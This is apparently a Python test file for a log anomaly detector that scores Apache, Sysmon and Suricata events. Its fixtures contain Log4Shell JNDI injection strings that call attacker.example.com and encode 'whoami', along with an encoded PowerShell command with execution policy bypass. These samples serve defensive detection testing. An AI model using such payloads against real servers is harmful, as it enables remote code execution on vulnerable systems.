"""Tests for the per-source-format anomaly detector (Étape 3.B)."""

from __future__ import annotations

import sys
import unittest
from datetime import datetime, timezone
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(PROJECT_ROOT))

from marine_log_sentinel.ingestion.schema import (  # noqa: E402
    EventCategory,
    NormalizedLog,
    SourceFormat,
)
from marine_log_sentinel.ml import AnomalyDetector  # noqa: E402
from marine_log_sentinel.ml.anomaly import _heuristic_score, _sigmoid  # noqa: E402
from marine_log_sentinel.ml.features import extract_features  # noqa: E402


def _apache_log(
    *,
    path: str = "/index.html",
    status: int = 200,
    user_agent: str = "Mozilla/5.0",
    payload: str | None = None,
    raw: str | None = None,
) -> NormalizedLog:
    return NormalizedLog(
        timestamp_utc=datetime(2026, 5, 12, 10, 0, tzinfo=timezone.utc),
        source_format=SourceFormat.APACHE_ACCESS,
        event_category=EventCategory.WEB_REQUEST,
        source_file="Apache.JSON",
        raw=raw or f'10.0.0.1 - - "GET {path} HTTP/1.1" {status}',
        http_method="GET",
        http_path=path,
        http_status=status,
        http_user_agent=user_agent,
        payload=payload,
    )


def _sysmon_log(
    *,
    cmdline: str = "C:\\Windows\\System32\\notepad.exe",
    process: str = "notepad.exe",
    user: str = "user1",
    payload: str | None = None,
) -> NormalizedLog:
    return NormalizedLog(
        timestamp_utc=datetime(2026, 5, 12, 10, 0, tzinfo=timezone.utc),
        source_format=SourceFormat.WINDOWS_SYSMON,
        event_category=EventCategory.PROCESS_EXECUTION,
        source_file="Sysmon.JSON",
        raw=cmdline,
        process_name=process,
        process_cmdline=cmdline,
        user=user,
        payload=payload,
    )


class FeatureExtractionTest(unittest.TestCase):
    def test_payload_entropy_reacts_to_base64(self):
        plain = _apache_log(payload="user=alice&page=1")
        encoded = _apache_log(
            payload="aHR0cDovL2F0dGFja2VyLmV4YW1wbGUuY29tL2EvYi9jL2QvZS9mL2c="
        )
        f_plain = extract_features(plain)
        f_encoded = extract_features(encoded)
        self.assertGreater(f_encoded.entropy, f_plain.entropy)

    def test_suspicious_token_count_detects_powershell(self):
        log = _sysmon_log(
            cmdline=(
                "powershell -EncodedCommand "
                "SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoA"
            )
        )
        features = extract_features(log)
        self.assertGreaterEqual(features.suspicious_token_count, 2)

    def test_is_admin_user_flag(self):
        normal = _sysmon_log(user="alice")
        admin = _sysmon_log(user="Administrator")
        self.assertEqual(extract_features(normal).is_admin_user, 0)
        self.assertEqual(extract_features(admin).is_admin_user, 1)


class IsolationForestTrainTest(unittest.TestCase):
    def test_log4shell_is_more_anomalous_than_normal_apache_traffic(self):
        normal_logs = [
            _apache_log(path=f"/page-{i}.html", status=200, payload=f"q=hello-{i}")
            for i in range(20)
        ]
        log4shell = _apache_log(
            path="/?x=${jndi:ldap://attacker.example.com:1389/Basic/Command/Base64/d2hvYW1p}",
            status=200,
            user_agent="${jndi:ldap://attacker.example.com:1389/Exploit}",
            payload="${jndi:ldap://attacker.example.com:1389/Basic/Command/Base64/d2hvYW1p}",
        )
        detector = AnomalyDetector().fit(normal_logs + [log4shell])
        normal_scores = [detector.predict(log).score for log in normal_logs]
        attack_score = detector.predict(log4shell).score
        self.assertGreater(
            attack_score,
            max(normal_scores),
            f"Log4Shell score {attack_score:.3f} should exceed max normal {max(normal_scores):.3f}",
        )

    def test_powershell_encoded_is_anomalous_in_sysmon(self):
        normal_logs = [
            _sysmon_log(cmdline=f"C:\\Windows\\System32\\notepad.exe doc{i}.txt", process="notepad.exe")
            for i in range(15)
        ]
        attack = _sysmon_log(
            cmdline=(
                "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand "
                "SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAA"
                "JABDAGwAaQBlAG4AdAAuAFcARgBlAGkAZwBoAHQAOgA1MzAA"
            ),
            process="powershell.exe",
            user="Administrator",
        )
        detector = AnomalyDetector().fit(normal_logs + [attack])
        normal_max = max(detector.predict(log).score for log in normal_logs)
        attack_score = detector.predict(attack).score
        self.assertGreater(attack_score, normal_max)

    def test_models_are_per_source_format(self):
        apache_normal = [_apache_log(path=f"/a-{i}") for i in range(10)]
        sysmon_normal = [_sysmon_log(cmdline=f"notepad-{i}.exe") for i in range(10)]
        detector = AnomalyDetector().fit(apache_normal + sysmon_normal)
        self.assertIn(SourceFormat.APACHE_ACCESS.value, detector.models)
        self.assertIn(SourceFormat.WINDOWS_SYSMON.value, detector.models)
        self.assertEqual(detector.models[SourceFormat.APACHE_ACCESS.value].method, "isolation_forest")
        self.assertEqual(detector.models[SourceFormat.WINDOWS_SYSMON.value].method, "isolation_forest")


class ColdStartTest(unittest.TestCase):
    def test_predict_uses_heuristic_when_no_model(self):
        detector = AnomalyDetector()
        attack = _apache_log(
            path="/?x=${jndi:ldap://attacker.example.com/a}",
            payload="aHR0cDovL2F0dGFja2VyLmV4YW1wbGUuY29tL2EvYi9jL2QvZS9mL2c=",
        )
        score = detector.predict(attack)
        self.assertEqual(score.method, "heuristic")
        self.assertGreater(score.score, 0.2)

    def test_fit_with_tiny_batch_falls_back_to_heuristic(self):
        detector = AnomalyDetector().fit([_apache_log()] * 2)
        self.assertEqual(detector.models[SourceFormat.APACHE_ACCESS.value].method, "heuristic")

    def test_heuristic_score_is_bounded(self):
        for payload in ("", "x", "powershell -enc " + "A" * 200):
            log = _sysmon_log(payload=payload)
            value = _heuristic_score(log)
            self.assertGreaterEqual(value, 0.0)
            self.assertLessEqual(value, 1.0)

    def test_heuristic_floor_for_ids_alert(self):
        suricata_alert = NormalizedLog(
            timestamp_utc=datetime(2026, 5, 12, 10, 0, tzinfo=timezone.utc),
            source_format=SourceFormat.SURICATA_EVE,
            event_category=EventCategory.NETWORK_ALERT,
            source_file="Suricata.JSON",
            raw='{"event_type":"alert","src_ip":"1.2.3.4"}',
            src_ip="1.2.3.4",
            dst_ip="10.0.0.5",
            signature="ET TROJAN Generic Command Execution",
            signature_severity="Major",
        )
        self.assertGreaterEqual(_heuristic_score(suricata_alert), 0.5)

    def test_heuristic_floor_for_network_alert_without_signature(self):
        alert = NormalizedLog(
            timestamp_utc=datetime(2026, 5, 12, 10, 0, tzinfo=timezone.utc),
            source_format=SourceFormat.SURICATA_EVE,
            event_category=EventCategory.NETWORK_ALERT,
            source_file="Suricata.JSON",
            raw="{}",
        )
        self.assertGreaterEqual(_heuristic_score(alert), 0.3)


class BatchPredictTest(unittest.TestCase):
    def test_batch_predict_keeps_input_order(self):
        normal = [_apache_log(path=f"/x-{i}") for i in range(10)]
        attack = _apache_log(payload="${jndi:ldap://attacker.com/x}" * 5)
        mixed = [normal[0], attack, normal[1]]
        detector = AnomalyDetector().fit(normal + [attack])
        scores = detector.predict_batch(mixed)
        self.assertEqual(len(scores), 3)
        per_call = [detector.predict(log).score for log in mixed]
        for batch_score, call_score in zip(scores, per_call, strict=True):
            self.assertAlmostEqual(batch_score.score, call_score, places=5)


class SigmoidTest(unittest.TestCase):
    def test_sigmoid_mapping(self):
        self.assertAlmostEqual(_sigmoid(0.0), 0.5, places=5)
        self.assertLess(_sigmoid(0.3), 0.15)
        self.assertGreater(_sigmoid(-0.3), 0.85)


if __name__ == "__main__":
    unittest.main()
